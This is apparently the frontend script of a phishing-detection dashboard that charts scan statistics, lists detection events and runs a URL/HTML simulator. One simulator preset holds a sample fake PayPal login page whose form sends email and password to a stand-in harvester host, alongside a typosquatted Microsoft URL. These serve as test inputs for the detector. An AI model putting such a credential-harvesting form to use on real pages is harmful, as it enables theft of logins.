/**
 * PhishLens Cyber Threat Intelligence Dashboard Frontend Engine
 */

const API_BASE = "http://127.0.0.1:8000";

// Global State
let currentTab = "analytics";
let eventsLimit = 10;
let eventsOffset = 0;
let totalEventsCount = 0;
let currentFilter = "ALL";
let currentSearch = "";
let autoRefreshTimer = null;
let isBackendOnline = false;

// Format Unix Timestamp
function formatTime(ts) {
  if (!ts) return "--";
  const d = new Date(ts * 1000);
  return d.toLocaleDateString() + " " + d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
}

// Show Toast
function showToast(msg, type = "info") {
  const container = document.getElementById("toast-container");
  const toast = document.createElement("div");
  toast.className = `toast toast-${type}`;
  toast.textContent = msg;
  container.appendChild(toast);
  setTimeout(() => {
    toast.remove();
  }, 3500);
}

// Check Backend Health
async function checkHealth() {
  const statusEl = document.getElementById("system-status");
  try {
    const res = await fetch(`${API_BASE}/health`, { cache: "no-store" });
    if (res.ok) {
      isBackendOnline = true;
      statusEl.className = "status-indicator";
      statusEl.querySelector(".status-text").textContent = "Backend Online";
    } else {
      throw new Error();
    }
  } catch (e) {
    isBackendOnline = false;
    statusEl.className = "status-indicator offline";
    statusEl.querySelector(".status-text").textContent = "Backend Offline";
  }
}

// Fetch Analytics Stats
async function loadStats() {
  try {
    const res = await fetch(`${API_BASE}/stats`, { cache: "no-store" });
    if (!res.ok) return null;
    return await res.json();
  } catch (e) {
    return null;
  }
}

// Fetch 24-hour trend data
async function loadTrend(hours = 24) {
  try {
    const res = await fetch(`${API_BASE}/stats/trend?hours=${hours}`, { cache: "no-store" });
    if (!res.ok) return null;
    return await res.json();
  } catch (e) {
    return null;
  }
}

// Fetch Events Page
async function loadEvents(limit, offset, level, search) {
  try {
    let url = `${API_BASE}/events?limit=${limit}&offset=${offset}`;
    if (level && level !== "ALL") url += `&level=${encodeURIComponent(level)}`;
    if (search) url += `&search=${encodeURIComponent(search)}`;

    const res = await fetch(url, { cache: "no-store" });
    if (!res.ok) throw new Error("Failed to load events");
    return await res.json();
  } catch (e) {
    return { total: 0, events: [] };
  }
}

// Render SVG Donut Chart
function renderDonutChart(dangerous, suspicious, safe) {
  const total = dangerous + suspicious + safe;
  const svg = document.getElementById("donut-svg");
  document.getElementById("donut-center-total").textContent = total;

  document.getElementById("legend-dangerous-pct").textContent = total ? Math.round((dangerous / total) * 100) + "%" : "0%";
  document.getElementById("legend-suspicious-pct").textContent = total ? Math.round((suspicious / total) * 100) + "%" : "0%";
  document.getElementById("legend-safe-pct").textContent = total ? Math.round((safe / total) * 100) + "%" : "0%";

  if (total === 0) {
    svg.innerHTML = `
      <circle cx="100" cy="100" r="70" fill="none" stroke="rgba(255,255,255,0.06)" stroke-width="20" />
    `;
    return;
  }

  const radius = 70;
  const circumference = 2 * Math.PI * radius;
  const dPct = dangerous / total;
  const sPct = suspicious / total;
  const safePct = safe / total;

  const dStroke = dPct * circumference;
  const sStroke = sPct * circumference;
  const safeStroke = safePct * circumference;

  let offset = 0;
  const dDash = `${dStroke} ${circumference}`;
  const dOffset = offset;
  offset -= dStroke;

  const sDash = `${sStroke} ${circumference}`;
  const sOffset = offset;
  offset -= sStroke;

  const safeDash = `${safeStroke} ${circumference}`;
  const safeOffset = offset;

  svg.innerHTML = `
    <circle cx="100" cy="100" r="${radius}" fill="none" stroke="rgba(255,255,255,0.04)" stroke-width="20" />
    ${dangerous > 0 ? `<circle cx="100" cy="100" r="${radius}" fill="none" stroke="#ff3366" stroke-width="20" stroke-dasharray="${dDash}" stroke-dashoffset="${dOffset}" transform="rotate(-90 100 100)" stroke-linecap="round" />` : ""}
    ${suspicious > 0 ? `<circle cx="100" cy="100" r="${radius}" fill="none" stroke="#f59e0b" stroke-width="20" stroke-dasharray="${sDash}" stroke-dashoffset="${sOffset}" transform="rotate(-90 100 100)" stroke-linecap="round" />` : ""}
    ${safe > 0 ? `<circle cx="100" cy="100" r="${radius}" fill="none" stroke="#10b981" stroke-width="20" stroke-dasharray="${safeDash}" stroke-dashoffset="${safeOffset}" transform="rotate(-90 100 100)" stroke-linecap="round" />` : ""}
  `;
}

// Render 24-hour Threat Trend SVG Area Chart
function renderTrendChart(trendData) {
  const wrapper = document.getElementById("trend-chart-wrapper");
  if (!wrapper) return;

  const buckets = (trendData && trendData.trend) ? trendData.trend : [];
  if (!buckets.length) {
    wrapper.innerHTML = '<div class="empty-state-hint">No trend data available for the last 24 h.</div>';
    return;
  }

  const W = 680, H = 120, PAD_L = 36, PAD_B = 24, PAD_T = 12;
  const chartW = W - PAD_L;
  const chartH = H - PAD_B - PAD_T;

  const maxTotal = Math.max(...buckets.map(b => b.total), 1);

  // x / y helpers
  const xOf = (i) => PAD_L + (i / (buckets.length - 1 || 1)) * chartW;
  const yOf = (v) => PAD_T + chartH - (v / maxTotal) * chartH;

  const pts = (key) => buckets.map((b, i) => `${xOf(i).toFixed(1)},${yOf(b[key]).toFixed(1)}`).join(' ');

  // Build a filled area polygon for each tier
  const polyArea = (key, color, opacity) => {
    const fwd = buckets.map((b, i) => `${xOf(i).toFixed(1)},${yOf(b[key]).toFixed(1)}`).join(' ');
    const bsln = `${xOf(buckets.length - 1).toFixed(1)},${(PAD_T + chartH).toFixed(1)} ${PAD_L.toFixed(1)},${(PAD_T + chartH).toFixed(1)}`;
    return `<polygon points="${fwd} ${bsln}" fill="${color}" fill-opacity="${opacity}" />`;
  };

  const polyLine = (key, color) =>
    `<polyline points="${pts(key)}" fill="none" stroke="${color}" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" />`;

  // Y-axis labels
  const steps = 3;
  const yLabels = Array.from({ length: steps + 1 }, (_, i) => {
    const val = Math.round((i / steps) * maxTotal);
    const y = yOf(val);
    return `<text x="${PAD_L - 4}" y="${y + 4}" text-anchor="end" fill="#64748b" font-size="9">${val}</text>`;
  }).join('');

  // X-axis hour labels (every 4 hours)
  const xLabels = buckets.map((b, i) => {
    if (i % 4 !== 0 && i !== buckets.length - 1) return '';
    const label = b.hour.slice(11, 16); // "14:00"
    return `<text x="${xOf(i).toFixed(1)}" y="${H}" text-anchor="middle" fill="#64748b" font-size="9">${label}</text>`;
  }).join('');

  // Hover grid lines
  const gridLines = Array.from({ length: steps }, (_, i) => {
    const y = yOf(Math.round(((i + 1) / steps) * maxTotal));
    return `<line x1="${PAD_L}" y1="${y.toFixed(1)}" x2="${W}" y2="${y.toFixed(1)}" stroke="rgba(255,255,255,0.04)" stroke-width="1" />`;
  }).join('');

  wrapper.innerHTML = `
    <svg viewBox="0 0 ${W} ${H}" preserveAspectRatio="xMidYMid meet" style="width:100%;height:100%;">
      ${gridLines}
      ${polyArea('total', '#0ea5e9', 0.08)}
      ${polyArea('dangerous', '#ff3366', 0.18)}
      ${polyArea('suspicious', '#f59e0b', 0.15)}
      ${polyArea('safe', '#10b981', 0.12)}
      ${polyLine('total', '#0ea5e9')}
      ${polyLine('dangerous', '#ff3366')}
      ${polyLine('suspicious', '#f59e0b')}
      ${polyLine('safe', '#10b981')}
      ${yLabels}
      ${xLabels}
    </svg>
  `;
}

// Render Top Brands Bar Chart
function renderBrandsChart(topBrands) {
  const container = document.getElementById("brands-bar-wrapper");
  if (!topBrands || topBrands.length === 0) {
    container.innerHTML = `<div class="empty-state-hint">No brand impersonation events recorded yet.</div>`;
    return;
  }

  const maxCount = Math.max(...topBrands.map(b => b.count), 1);
  container.innerHTML = topBrands.map(b => {
    const pct = Math.round((b.count / maxCount) * 100);
    return `
      <div class="brand-bar-row">
        <div class="brand-bar-header">
          <span class="brand-bar-name">${escapeHtml(b.brand)}</span>
          <span class="brand-bar-count">${b.count} detections</span>
        </div>
        <div class="brand-bar-track">
          <div class="brand-bar-fill" style="width: ${pct}%"></div>
        </div>
      </div>
    `;
  }).join("");
}

// Render Recent Stream Table in Tab 1
function renderRecentStream(events) {
  const tbody = document.getElementById("recent-stream-tbody");
  if (!events || events.length === 0) {
    tbody.innerHTML = `<tr><td colspan="6" class="text-center py-6">No scans recorded yet.</td></tr>`;
    return;
  }

  tbody.innerHTML = events.slice(0, 6).map(e => {
    const pct = Math.round((e.risk_score || 0) * 100);
    const badgeClass = pct >= 80 ? "badge-dangerous" : (pct >= 50 ? "badge-suspicious" : "badge-safe");
    const reasons = e.reasons && e.reasons.length ? e.reasons.slice(0, 2).join("; ") : "Verified Normal";
    const brand = e.brand_target ? `<span class="brand-chip">${escapeHtml(e.brand_target)}</span>` : '<span class="text-muted">None</span>';

    return `
      <tr>
        <td><span class="text-muted">${formatTime(e.ts)}</span></td>
        <td><a href="${escapeHtml(e.url)}" target="_blank" rel="noreferrer" class="url-link" title="${escapeHtml(e.url)}">${escapeHtml(e.url)}</a></td>
        <td>${brand}</td>
        <td><span class="badge-pill ${badgeClass}">${pct}%</span></td>
        <td><small class="text-secondary">${escapeHtml(reasons)}</small></td>
        <td>
          <button class="btn btn-secondary btn-sm" onclick="inspectEvent(${e.id})">Inspect</button>
        </td>
      </tr>
    `;
  }).join("");
}

// Refresh Analytics Tab
async function refreshAnalytics() {
  const [stats, trend] = await Promise.all([loadStats(), loadTrend(24)]);
  if (!stats) return;

  document.getElementById("kpi-total-scans").textContent = stats.total_scans;
  document.getElementById("kpi-dangerous").textContent = stats.dangerous_count;
  document.getElementById("kpi-suspicious").textContent = stats.suspicious_count;
  document.getElementById("kpi-safe").textContent = stats.safe_count;
  document.getElementById("kpi-avg-risk").textContent = (stats.avg_risk_score * 100).toFixed(1) + "%";

  document.getElementById("event-count-badge").textContent = stats.total_scans;

  renderDonutChart(stats.dangerous_count, stats.suspicious_count, stats.safe_count);
  renderBrandsChart(stats.top_brands);
  renderRecentStream(stats.recent_scans);
  renderTrendChart(trend);
}

// Render Full Events Intelligence Table (Tab 3)
async function refreshFullEvents() {
  const data = await loadEvents(eventsLimit, eventsOffset, currentFilter, currentSearch);
  totalEventsCount = data.total || 0;
  const events = data.events || [];

  const tbody = document.getElementById("full-events-tbody");
  if (events.length === 0) {
    tbody.innerHTML = `<tr><td colspan="8" class="text-center py-6">No matching threat events found.</td></tr>`;
  } else {
    tbody.innerHTML = events.map(e => {
      const pct = Math.round((e.risk_score || 0) * 100);
      const tier = e.risk_level || (pct >= 80 ? "DANGEROUS" : pct >= 50 ? "SUSPICIOUS" : "SAFE");
      const badgeClass = tier === "DANGEROUS" ? "badge-dangerous" : (tier === "SUSPICIOUS" ? "badge-suspicious" : "badge-safe");
      const brand = e.brand_target ? `<span class="brand-chip">${escapeHtml(e.brand_target)}</span>` : '<span class="text-muted">—</span>';
      const reasonsSummary = (e.reasons && e.reasons.length) ? e.reasons.slice(0, 2).join("; ") : "No anomalies";

      return `
        <tr>
          <td><span class="text-muted font-mono">#${e.id}</span></td>
          <td><span class="text-muted">${formatTime(e.ts)}</span></td>
          <td><a href="${escapeHtml(e.url)}" target="_blank" rel="noreferrer" class="url-link" title="${escapeHtml(e.url)}">${escapeHtml(e.url)}</a></td>
          <td>${brand}</td>
          <td><span class="badge-pill ${badgeClass}">${tier}</span></td>
          <td><strong class="font-mono">${pct}%</strong></td>
          <td><small class="text-secondary">${escapeHtml(reasonsSummary)}</small></td>
          <td>
            <div style="display:flex;gap:6px;">
              <button class="btn btn-secondary btn-sm" onclick="inspectEvent(${e.id})" title="Inspect Event Details">Inspect</button>
              <button class="btn btn-danger-outline btn-sm" onclick="deleteSingleEvent(${e.id})" title="Delete Event">&times;</button>
            </div>
          </td>
        </tr>
      `;
    }).join("");
  }

  // Update Pagination Controls
  const start = totalEventsCount === 0 ? 0 : eventsOffset + 1;
  const end = Math.min(eventsOffset + eventsLimit, totalEventsCount);
  document.getElementById("pagination-info").textContent = `Showing ${start} to ${end} of ${totalEventsCount} events`;
  document.getElementById("page-num-display").textContent = `Page ${Math.floor(eventsOffset / eventsLimit) + 1}`;

  document.getElementById("btn-prev-page").disabled = eventsOffset === 0;
  document.getElementById("btn-next-page").disabled = end >= totalEventsCount;
}

// Global Refresh Handler
async function refreshAll() {
  await checkHealth();
  await refreshAnalytics();
  if (currentTab === "events") {
    await refreshFullEvents();
  }
}

// Event Inspector Modal
window.inspectEvent = async function(id) {
  try {
    const res = await fetch(`${API_BASE}/events/${id}`);
    if (!res.ok) throw new Error("Event not found");
    const e = await res.json();

    const pct = Math.round((e.risk_score || 0) * 100);
    const tier = e.risk_level || "SAFE";
    const badgeClass = tier === "DANGEROUS" ? "badge-dangerous" : (tier === "SUSPICIOUS" ? "badge-suspicious" : "badge-safe");
    const cat = e.category_scores || {};

    document.getElementById("modal-event-title").textContent = `Threat Event #${e.id}`;
    document.getElementById("modal-event-time").textContent = `Scanned at ${formatTime(e.ts)}`;

    const body = document.getElementById("modal-event-body");
    body.innerHTML = `
      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;">
        <span class="badge-pill ${badgeClass}" style="font-size:14px;padding:6px 14px;">${tier} THREAT (${pct}%)</span>
        ${e.brand_target ? `<span class="brand-chip" style="font-size:13px;padding:4px 10px;">Target: ${escapeHtml(e.brand_target)}</span>` : ""}
      </div>

      <div style="margin-bottom:16px;">
        <label style="font-size:11px;color:var(--text-muted);text-transform:uppercase;">Analyzed URL</label>
        <div style="background:rgba(0,0,0,0.3);padding:10px;border-radius:6px;font-family:var(--font-mono);font-size:12px;word-break:break-all;color:var(--color-cyan);border:1px solid var(--border-subtle);">
          ${escapeHtml(e.url)}
        </div>
      </div>

      <div style="margin-bottom:20px;">
        <label style="font-size:11px;color:var(--text-muted);text-transform:uppercase;margin-bottom:8px;display:block;">Category Sub-Scores</label>
        <div class="sim-categories-grid">
          <div class="sim-cat-card">
            <div class="sim-cat-lbl">Domain Risk</div>
            <div class="sim-cat-val">${Math.round((cat.domain_risk || 0) * 100)}%</div>
          </div>
          <div class="sim-cat-card">
            <div class="sim-cat-lbl">URL Obfuscation</div>
            <div class="sim-cat-val">${Math.round((cat.url_risk || 0) * 100)}%</div>
          </div>
          <div class="sim-cat-card">
            <div class="sim-cat-lbl">Brand Impersonation</div>
            <div class="sim-cat-val">${Math.round((cat.brand_risk || 0) * 100)}%</div>
          </div>
          <div class="sim-cat-card">
            <div class="sim-cat-lbl">DOM & Form Security</div>
            <div class="sim-cat-val">${Math.round((cat.dom_risk || 0) * 100)}%</div>
          </div>
          <div class="sim-cat-card" style="border-color:rgba(139,92,246,0.3);">
            <div class="sim-cat-lbl" style="color:#a78bfa;">ML Classifier</div>
            <div class="sim-cat-val" style="color:#a78bfa;">${Math.round((cat.ml_risk || 0) * 100)}%</div>
          </div>
        </div>
      </div>

      <div>
        <label style="font-size:11px;color:var(--text-muted);text-transform:uppercase;margin-bottom:8px;display:block;">Explainability & Anomaly Reasons</label>
        <div class="sim-reasons-list">
          ${(e.structured_reasons && e.structured_reasons.length) ? e.structured_reasons.map(r => `
            <div class="sim-reason-item ${r.severity}">
              <div>
                <strong>[${r.severity}] ${escapeHtml(r.title)}:</strong>
                <div>${escapeHtml(r.description)}</div>
              </div>
            </div>
          `).join("") : (e.reasons && e.reasons.length ? e.reasons.map(r => `<div class="sim-reason-item">${escapeHtml(r)}</div>`).join("") : '<div class="text-muted">No specific threat flags detected.</div>')}
        </div>
      </div>
    `;

    document.getElementById("event-modal-backdrop").classList.add("open");
  } catch (err) {
    showToast("Error opening event inspection", "error");
  }
};

// Delete Single Event
window.deleteSingleEvent = async function(id) {
  if (!confirm(`Delete detection event #${id}?`)) return;
  try {
    const res = await fetch(`${API_BASE}/events/${id}`, { method: "DELETE" });
    if (res.ok) {
      showToast(`Event #${id} deleted.`);
      await refreshAll();
    }
  } catch (e) {
    showToast("Failed to delete event", "error");
  }
};

// Simulator Presets
document.getElementById("preset-fake-paypal").onclick = () => {
  document.getElementById("sim-url").value = "https://paypa1-security-verify.com/account/login.php";
  document.getElementById("sim-html").value = `<!DOCTYPE html>
<html>
  <head><title>PayPal - Security Verification</title></head>
  <body>
    <img src="https://example.com/images/paypal_logo.png" alt="paypal" />
    <form action="http://malicious-harvester-drop.xyz/collect" method="POST">
      <input type="email" name="user" placeholder="Email" />
      <input type="password" name="password" placeholder="Password" />
      <button type="submit">Log In</button>
    </form>
  </body>
</html>`;
};

document.getElementById("preset-typosquat").onclick = () => {
  document.getElementById("sim-url").value = "https://login.micros0ft-online-support.com/auth";
  document.getElementById("sim-html").value = `<html><head><title>Microsoft Account Verification</title></head><body><h1>Verify Account</h1></body></html>`;
};

document.getElementById("preset-safe-github").onclick = () => {
  document.getElementById("sim-url").value = "https://github.com/login";
  document.getElementById("sim-html").value = `<html><head><title>Sign in to GitHub · GitHub</title></head><body><form action="/session" method="post"><input type="password" /></form></body></html>`;
};

// Run Simulator Form
document.getElementById("simulator-form").onsubmit = async (e) => {
  e.preventDefault();
  const url = document.getElementById("sim-url").value.trim();
  const html = document.getElementById("sim-html").value;
  const persist = document.getElementById("sim-persist").checked;
  const btn = document.getElementById("btn-run-sim");

  btn.disabled = true;
  btn.textContent = "Analyzing Heuristics...";

  try {
    const res = await fetch(`${API_BASE}/simulate`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ url, html, persist }),
    });

    if (!res.ok) throw new Error("Simulation request failed");
    const result = await res.json();
    renderSimResult(result);
    if (persist) {
      showToast("Simulation logged to database.");
      await refreshAll();
    }
  } catch (err) {
    showToast("Error running simulation. Is backend running?", "error");
  } finally {
    btn.disabled = false;
    btn.innerHTML = `<svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2"><polygon points="5 3 19 12 5 21 5 3"/></svg> Analyze Threat Now`;
  }
};

// Render Simulator Output
function renderSimResult(res) {
  const container = document.getElementById("sim-result-body");
  const pct = Math.round((res.risk_score || 0) * 100);
  const tier = res.risk_level || "SAFE";
  const tierClass = tier === "DANGEROUS" ? "danger" : (tier === "SUSPICIOUS" ? "warning" : "safe");
  const cat = res.category_scores || {};

  container.innerHTML = `
    <div class="sim-header-result ${tierClass}">
      <div>
        <div style="font-size:12px;text-transform:uppercase;letter-spacing:1px;font-weight:600;">Overall Threat Assessment</div>
        <div style="font-size:20px;font-weight:700;">${tier} PHISHING THREAT</div>
        ${res.brand_target ? `<div style="font-size:13px;margin-top:4px;">Impersonating: <span class="brand-chip">${escapeHtml(res.brand_target)}</span></div>` : ""}
      </div>
      <div class="sim-score-dial">${pct}%</div>
    </div>

    ${res.cached ? '<div style="font-size:11px;color:#38bdf8;background:rgba(56,189,248,0.08);border:1px solid rgba(56,189,248,0.2);border-radius:4px;padding:4px 10px;display:inline-block;margin-bottom:10px;">⚡ Result served from cache (TTL 5 min)</div>' : ''}

    <div style="margin-bottom:16px;">
      <label style="font-size:11px;color:var(--text-muted);text-transform:uppercase;margin-bottom:8px;display:block;">Threat Category Sub-Scores</label>
      <div class="sim-categories-grid">
        <div class="sim-cat-card">
          <div class="sim-cat-lbl">Domain Risk</div>
          <div class="sim-cat-val">${Math.round((cat.domain_risk || 0) * 100)}%</div>
        </div>
        <div class="sim-cat-card">
          <div class="sim-cat-lbl">URL Obfuscation</div>
          <div class="sim-cat-val">${Math.round((cat.url_risk || 0) * 100)}%</div>
        </div>
        <div class="sim-cat-card">
          <div class="sim-cat-lbl">Brand Impersonation</div>
          <div class="sim-cat-val">${Math.round((cat.brand_risk || 0) * 100)}%</div>
        </div>
        <div class="sim-cat-card">
          <div class="sim-cat-lbl">DOM & Form Security</div>
          <div class="sim-cat-val">${Math.round((cat.dom_risk || 0) * 100)}%</div>
        </div>
        <div class="sim-cat-card" style="border-color:rgba(139,92,246,0.3);">
          <div class="sim-cat-lbl" style="color:#a78bfa;">ML Classifier</div>
          <div class="sim-cat-val" style="color:#a78bfa;">${Math.round((cat.ml_risk || 0) * 100)}%</div>
        </div>
        <div class="sim-cat-card" style="border-color:rgba(16,185,129,0.3);">
          <div class="sim-cat-lbl" style="color:#34d399;">Trust Score</div>
          <div class="sim-cat-val" style="color:#34d399;">${Math.round((cat.trust_score || 0) * 100)}%</div>
        </div>
      </div>
    </div>

    <div>
      <label style="font-size:11px;color:var(--text-muted);text-transform:uppercase;margin-bottom:8px;display:block;">Explainability & Anomaly Reasons (${(res.reasons || []).length})</label>
      <div class="sim-reasons-list">
        ${(res.structured_reasons && res.structured_reasons.length) ? res.structured_reasons.map(r => `
          <div class="sim-reason-item ${r.severity}">
            <div>
              <strong>[${r.severity}] ${escapeHtml(r.title)}:</strong>
              <div>${escapeHtml(r.description)}</div>
            </div>
          </div>
        `).join("") : (res.reasons && res.reasons.length ? res.reasons.map(r => `<div class="sim-reason-item">${escapeHtml(r)}</div>`).join("") : '<div class="text-muted">No specific threat flags detected. Page appears clean.</div>')}
      </div>
    </div>

    ${res.highlights && res.highlights.length ? `
      <div style="margin-top:16px;">
        <label style="font-size:11px;color:var(--text-muted);text-transform:uppercase;margin-bottom:6px;display:block;">Flagged DOM Selectors</label>
        <div style="background:rgba(0,0,0,0.3);padding:8px 12px;border-radius:6px;font-family:var(--font-mono);font-size:12px;color:#38bdf8;">
          ${res.highlights.map(s => `<code>${escapeHtml(s)}</code>`).join(", ")}
        </div>
      </div>
    ` : ""}
  `;
}

// Export Events as CSV
document.getElementById("btn-export-csv").onclick = async () => {
  const data = await loadEvents(1000, 0, currentFilter, currentSearch);
  const events = data.events || [];
  if (!events.length) {
    showToast("No events to export.");
    return;
  }

  const headers = ["ID", "Timestamp", "URL", "Risk Level", "Risk Score", "Brand Target", "Reasons"];
  const rows = events.map(e => [
    e.id,
    new Date(e.ts * 1000).toISOString(),
    `"${(e.url || "").replace(/"/g, '""')}"`,
    e.risk_level || "SAFE",
    e.risk_score,
    `"${(e.brand_target || "").replace(/"/g, '""')}"`,
    `"${(e.reasons || []).join('; ').replace(/"/g, '""')}"`,
  ]);

  const csvContent = [headers.join(","), ...rows.map(r => r.join(","))].join("\n");
  const blob = new Blob([csvContent], { type: "text/csv;charset=utf-8;" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = `phishlens_events_${Date.now()}.csv`;
  a.click();
  URL.revokeObjectURL(url);
  showToast("Exported CSV successfully.");
};

// Export Events as JSON
document.getElementById("btn-export-json").onclick = async () => {
  const data = await loadEvents(1000, 0, currentFilter, currentSearch);
  const events = data.events || [];
  if (!events.length) {
    showToast("No events to export.");
    return;
  }
  const blob = new Blob([JSON.stringify(events, null, 2)], { type: "application/json" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = `phishlens_events_${Date.now()}.json`;
  a.click();
  URL.revokeObjectURL(url);
  showToast("Exported JSON successfully.");
};

// Clear All Events
document.getElementById("btn-clear-events").onclick = async () => {
  if (!confirm("Are you sure you want to delete all recorded detection events?")) return;
  try {
    const res = await fetch(`${API_BASE}/events`, { method: "DELETE" });
    if (res.ok) {
      showToast("All events cleared.");
      await refreshAll();
    }
  } catch (e) {
    showToast("Failed to clear events", "error");
  }
};

// Search & Filter Events
document.getElementById("events-search").oninput = debounce(async (e) => {
  currentSearch = e.target.value.trim();
  eventsOffset = 0;
  await refreshFullEvents();
}, 300);

document.querySelectorAll(".filter-pill").forEach(btn => {
  btn.onclick = async () => {
    document.querySelectorAll(".filter-pill").forEach(b => b.classList.remove("active"));
    btn.classList.add("active");
    currentFilter = btn.getAttribute("data-filter");
    eventsOffset = 0;
    await refreshFullEvents();
  };
});

// Pagination Navigation
document.getElementById("btn-prev-page").onclick = async () => {
  if (eventsOffset > 0) {
    eventsOffset = Math.max(0, eventsOffset - eventsLimit);
    await refreshFullEvents();
  }
};

document.getElementById("btn-next-page").onclick = async () => {
  if (eventsOffset + eventsLimit < totalEventsCount) {
    eventsOffset += eventsLimit;
    await refreshFullEvents();
  }
};

// Navigation Tab Switching
document.querySelectorAll(".nav-tab").forEach(tab => {
  tab.onclick = () => {
    document.querySelectorAll(".nav-tab").forEach(t => t.classList.remove("active"));
    document.querySelectorAll(".tab-pane").forEach(p => p.classList.remove("active"));

    tab.classList.add("active");
    const target = tab.getAttribute("data-tab");
    currentTab = target;
    document.getElementById(`tab-${target}`).classList.add("active");

    if (target === "events") {
      refreshFullEvents();
    } else if (target === "analytics") {
      refreshAnalytics();
    }
  };
});

document.getElementById("btn-view-all-events").onclick = () => {
  document.getElementById("tab-btn-events").click();
};

// Modal Close Handlers
document.getElementById("btn-close-modal").onclick = () => {
  document.getElementById("event-modal-backdrop").classList.remove("open");
};

document.getElementById("event-modal-backdrop").onclick = (e) => {
  if (e.target.id === "event-modal-backdrop") {
    document.getElementById("event-modal-backdrop").classList.remove("open");
  }
};

// Global Sync Button
document.getElementById("btn-global-refresh").onclick = refreshAll;

// Auto Refresh Timer Config
function setupAutoRefresh() {
  if (autoRefreshTimer) clearInterval(autoRefreshTimer);
  const interval = parseInt(document.getElementById("auto-refresh-select").value, 10);
  if (interval > 0) {
    autoRefreshTimer = setInterval(refreshAll, interval);
  }
}

document.getElementById("auto-refresh-select").onchange = setupAutoRefresh;

// Utility: HTML Escaping
function escapeHtml(str) {
  if (!str) return "";
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

// Utility: Debounce
function debounce(func, wait) {
  let timeout;
  return function(...args) {
    clearTimeout(timeout);
    timeout = setTimeout(() => func.apply(this, args), wait);
  };
}

// Init
window.addEventListener("DOMContentLoaded", () => {
  refreshAll();
  setupAutoRefresh();
});
